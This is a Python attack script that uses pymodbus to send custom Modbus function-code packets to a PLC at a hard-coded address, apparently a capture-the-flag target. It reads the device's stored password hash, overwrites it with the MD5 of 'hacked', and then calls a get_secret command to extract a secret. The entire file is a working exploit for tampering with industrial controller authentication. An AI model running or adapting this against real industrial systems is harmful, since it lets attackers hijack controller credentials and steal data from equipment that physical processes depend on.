from pymodbus.client import ModbusTcpClient
from pymodbus.pdu import ModbusRequest, ModbusResponse
import struct, hashlib
from pymodbus.transaction import ModbusSocketFramer

HOST_IP = '154.57.164.70'
HOST_PORT = 32538
CUSTOM_FC = 0x64

class CustomRequest(ModbusRequest):
    function_code = CUSTOM_FC
    def __init__(self, data=None, **kwargs):
        super().__init__(**kwargs)
        self.data = data if data is not None else []
    def encode(self):
        return struct.pack('B' * len(self.data), *self.data)
    def decode(self, data): pass

class CustomResponse(ModbusResponse):
    function_code = CUSTOM_FC
    def __init__(self, data=None, **kwargs):
        super().__init__(**kwargs)
        self.data = data if data is not None else []
    def encode(self): pass
    def decode(self, data):
        self.data = struct.unpack('>' + 'B' * len(data), data)

def send_packet(client, data):
    req = CustomRequest(data=data)
    resp = client.execute(req)
    if resp.function_code < 0x80:
        return resp.data
    return None

client = ModbusTcpClient(HOST_IP, port=HOST_PORT, framer=ModbusSocketFramer)
client.framer.decoder.register(CustomResponse)
if not client.connect():
    print("[-] Failed"); exit()
print("[+] Connected!\n")

my_password = b'hacked'
my_md5 = hashlib.md5(my_password).digest()
print(f"[*] Our MD5('hacked') = {my_md5.hex()}")

# Step 1: Re-read block 1 to see current stored hash
print("\n[*] Current stored hash at block 1:")
resp = send_packet(client, [0x00, 0x20, 0x00, 0x04, 0x00, 20])
stored = bytes(resp[3:19])
print(f"    {stored.hex()}")
print(f"    Matches our MD5: {stored == my_md5}")

# Step 2: Re-write our MD5 to make sure it's there
print("\n[*] Writing MD5('hacked') to block 1...")
write_pkt = [0x00, 0x21, 0x00, 0x04, 0x00] + list(my_md5)
resp = send_packet(client, write_pkt)
print(f"    Write response: {resp}  (expect: 0,33,255,1 for success)")

# Step 3: Try get_secret with PLAINTEXT password (PLC hashes internally)
print("\n[*] get_secret with PLAINTEXT 'hacked':")
resp = send_packet(client, [0x00, 0x22] + list(my_password))
print(f"    Response: {resp}")
if resp and not (len(resp) >= 5 and resp[3] == 0xe0 and resp[4] == 0x09):
    print(f"    *** SECRET hex  : {bytes(resp[3:]).hex()}")
    print(f"    *** SECRET ascii: {bytes(resp[3:]).decode('ascii', errors='replace')}")

# Step 4: Also try get_secret with our MD5 bytes (in case PLC does direct compare)
print("\n[*] get_secret with MD5 bytes:")
resp = send_packet(client, [0x00, 0x22] + list(my_md5))
print(f"    Response: {resp}")
if resp and not (len(resp) >= 5 and resp[3] == 0xe0 and resp[4] == 0x09):
    print(f"    *** SECRET hex  : {bytes(resp[3:]).hex()}")
    print(f"    *** SECRET ascii: {bytes(resp[3:]).decode('ascii', errors='replace')}")

client.close()
